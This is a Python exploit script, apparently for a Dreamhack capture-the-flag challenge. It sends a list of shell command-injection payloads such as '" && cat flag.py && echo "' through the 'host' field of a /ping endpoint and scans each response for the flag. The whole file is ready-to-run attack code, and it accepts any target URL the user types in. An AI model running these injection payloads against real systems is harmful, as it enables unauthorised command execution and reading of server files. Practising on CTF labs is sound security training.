#!/usr/bin/env python3
import requests
import re
from bs4 import BeautifulSoup

# 타겟 URL 설정
TARGET_URL = input("Enter target URL (e.g., http://localhost:8000): ").strip()
if not TARGET_URL:
    TARGET_URL = "http://host8.dreamhack.games:13154"

PING_ENDPOINT = f"{TARGET_URL}/ping"

# 여러 페이로드 시도
payloads = [
    '" && cat flag.py && echo "',
    '" ; cat flag.py ; echo "',
    '" || cat flag.py || echo "',
    '"; cat flag.py #',
    '" && cat flag.py #',
    '127.0.0.1" && cat flag.py && echo "',
    '8.8.8.8" && cat flag.py && echo "',
]

print("[*] Starting CTF exploit for Command Injection")
print(f"[*] Target: {PING_ENDPOINT}\n")

def extract_flag(text):
    """응답에서 플래그 추출"""
    # DH{...} 형식의 플래그 찾기
    flag_match = re.search(r'DH\{[^}]+\}', text)
    if flag_match:
        return flag_match.group(0)
    
    # FLAG = '...' 형식 찾기
    flag_match = re.search(r"FLAG\s*=\s*['\"]([^'\"]+)['\"]", text)
    if flag_match:
        return flag_match.group(1)
    
    return None

for i, payload in enumerate(payloads, 1):
    print(f"[{i}/{len(payloads)}] Trying payload: {payload}")
    
    try:
        response = requests.post(
            PING_ENDPOINT,
            data={'host': payload},
            timeout=10
        )
        
        if response.status_code == 200:
            # HTML 파싱
            soup = BeautifulSoup(response.text, 'html.parser')
            output = soup.get_text()
            
            # 플래그 찾기
            flag = extract_flag(output)
            
            if flag:
                print(f"\n{'='*60}")
                print(f"[+] SUCCESS! Flag found: {flag}")
                print(f"{'='*60}")
                print(f"[+] Working payload: {payload}\n")
                
                # 전체 응답 출력
                print("[+] Full response:")
                print("-" * 60)
                print(output[:1000])  # 처음 1000자만 출력
                print("-" * 60)
                break
            else:
                # flag.py 관련 내용이 있는지 확인
                if 'flag.py' in output.lower() or 'FLAG' in output:
                    print(f"[!] Possible success but flag format not recognized")
                    print(f"[!] Response preview: {output[:200]}")
                else:
                    print(f"[-] No flag found in response")
        else:
            print(f"[-] HTTP {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
    
    print()

else:
    print("[!] All payloads failed. Manual investigation needed.")
    print("[!] Try using browser dev tools to bypass client-side validation.")